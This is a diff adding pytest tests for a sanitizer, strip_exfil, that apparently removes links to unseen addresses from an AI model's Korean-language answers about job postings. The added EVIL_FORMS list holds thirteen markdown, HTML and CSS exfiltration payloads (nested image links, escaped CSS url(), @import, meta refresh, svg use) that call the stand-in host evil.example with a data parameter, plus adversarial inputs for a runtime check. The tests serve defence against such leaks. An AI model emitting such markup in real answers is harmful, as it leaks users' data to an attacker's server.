@@ -76,6 +76,46 @@ def test_nested_brackets_data_href_link_tag_and_css_url_lose_unseen_addresses():
     assert "<https://jobs.example/p/1>" in out
 
 
+EVIL_FORMS = [
+    "![a [b [c] d] e](https://evil.example/x?d=S)",
+    "[a [b] c](https://evil.example/x?d=S)",
+    "[![x](https://evil.example/i.png)](https://evil.example/x?d=S)",
+    '<a title="href=https://jobs.example/p/1" href="https://evil.example/x?d=S">t</a>',
+    '<a title=">" href="https://evil.example/x?d=S">t</a>',
+    '<p style="background:url&#40;https://evil.example/x?d=S&#41;">t</p>',
+    '<p style="background:u\\72l(https://evil.example/x?d=S)">t</p>',
+    "<style>@import 'https://evil.example/x?d=S';</style>",
+    '<div style="background:image-set(\'https://evil.example/x?d=S\' 1x)">t</div>',
+    '<table background="https://evil.example/x?d=S"><tr><td>t</td></tr></table>',
+    '<input type=image src="https://evil.example/x?d=S">',
+    '<meta http-equiv="refresh" content="0;url=https://evil.example/x?d=S">',
+    '<svg><use href="https://evil.example/x.svg#a"></use></svg>',
+]
+
+
+@pytest.mark.parametrize("form", EVIL_FORMS)
+def test_deeper_nesting_and_attribute_tricks_lose_unseen_addresses(form):
+    out = strip_exfil(f"앞 {form} 뒤", "https://jobs.example/p/1")
+
+    assert "evil.example" not in out
+    assert out.startswith("앞 ") and out.endswith(" 뒤")
+
+
+def test_a_link_to_a_seen_address_keeps_its_label_and_target_through_nesting():
+    out = strip_exfil("[공고 [1] 보기](https://jobs.example/p/1)", "https://jobs.example/p/1")
+
+    assert out == "[공고 [1] 보기](https://jobs.example/p/1)"
+
+
+def test_strip_exfil_stays_linear_on_adversarial_text():
+    import time
+
+    for hostile in ["[" * 200_000, "![" * 100_000, "url(" * 50_000, "<a href=" * 30_000, "[]" * 100_000]:
+        started = time.perf_counter()
+        strip_exfil(hostile, "")
+        assert time.perf_counter() - started < 3, hostile[:6]
+
+
 def test_an_answer_without_markup_is_unchanged():
     text = "공고를 저장했어요. https://jobs.example/p/1 에서 볼 수 있어요."
 
